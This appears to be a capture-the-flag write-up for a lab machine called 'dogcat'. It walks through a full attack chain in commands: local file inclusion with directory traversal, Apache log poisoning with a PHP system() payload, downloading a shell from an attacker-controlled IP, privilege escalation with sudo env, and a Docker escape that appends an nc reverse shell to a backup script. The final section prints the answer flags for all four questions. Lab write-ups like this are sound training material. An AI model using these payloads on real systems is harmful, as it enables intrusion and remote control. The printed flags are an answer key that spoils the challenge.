# dogcat 

Welcome to the DogCat website! Here, you can enjoy browsing through pictures of adorable dogs and cats. 
This site also provides an opportunity to exploit a PHP application via Local File Inclusion (LFI) and escape from a Docker container.

IP Address: `10.10.48.112`

## Initial Reconnaissance

### Nmap Scan

To gather information about open ports and services, run the following Nmap scan:

```
nmap -sC -sV -oN initial.log 10.10.48.112
```

The scan reveals the following open ports and services:

- **22/tcp**: OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- **80/tcp**: Apache httpd 2.4.38 ((Debian))

## Task 1.

### Nikto Scan

Use the Nikto scanner to detect vulnerabilities in the HTTP service:

```
nikto -h http://10.10.48.112 | tee nikto.log
```

### Local File Inclusion (LFI) Attack

The application processes files via the `view` parameter. You can exploit this by performing an LFI attack using the `php://filter` wrapper to encode server-side files in Base64. For example:

```
http://10.10.48.112/?view=php://filter/convert.base64-encode/resource=dog
```

By examining the source code of `index.php`, the following snippet is revealed:

```
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if (isset($_GET['view'])) {
    if (containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
```

This snippet checks for `dog` or `cat` in the `view` parameter but fails to prevent directory traversal attacks. Using a crafted parameter, such as:

```
dog/../../../../../../../../etc/passwd
```

with `ext=` allows access to sensitive files like `/etc/passwd`. Example output:

```
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### Remote Code Execution (RCE)

Injecting PHP code into the User-Agent header enables command execution via the `c` parameter in the URL. Example:

```
curl "http://10.10.48.112/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
```

To upload a reverse shell, serve the file using a local Python HTTP server:

```
python3 -m http.server
```

Access the application logs:

```
view-source:http://10.10.48.112/?view=cat/../../../../../../../../../../var/log/apache2/access.log&ext&c=curl%20http://10.23.56.130:8000/shell.php%20-o%20shell.php
```

Execute the uploaded php to obtain the reverse shell:

```
http://10.10.48.112/shell.php
```

### Privilege Escalation

Run the following command to check sudo privileges:

```
sudo -l
```

Output:

```
User www-data may run the following commands on 8e71e0279cea:
    (root) NOPASSWD: /usr/bin/env
```

Using GTFOBins I see how to escalate to root privileges using `env` binary and retrieve the first three flags.

### Escaping Docker

Check `/opt/backups` for a `backup.sh` file:

```
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

Append a reverse shell payload to the script:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.23.56.130 8888 >/tmp/f
```

This provides access to the host machine and the final flag.

## Questions

1. What is flag 1?
    > THM{Th1s_1s_N0t_4_Catdog_ab67edfa}

2. What is flag 2?
    > THM{LF1_t0_RC3_aec3fb}

3. What is flag 3?
    > THM{D1ff3r3nt_3nv1ronments_874112}

4. What is flag 4?
    > THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}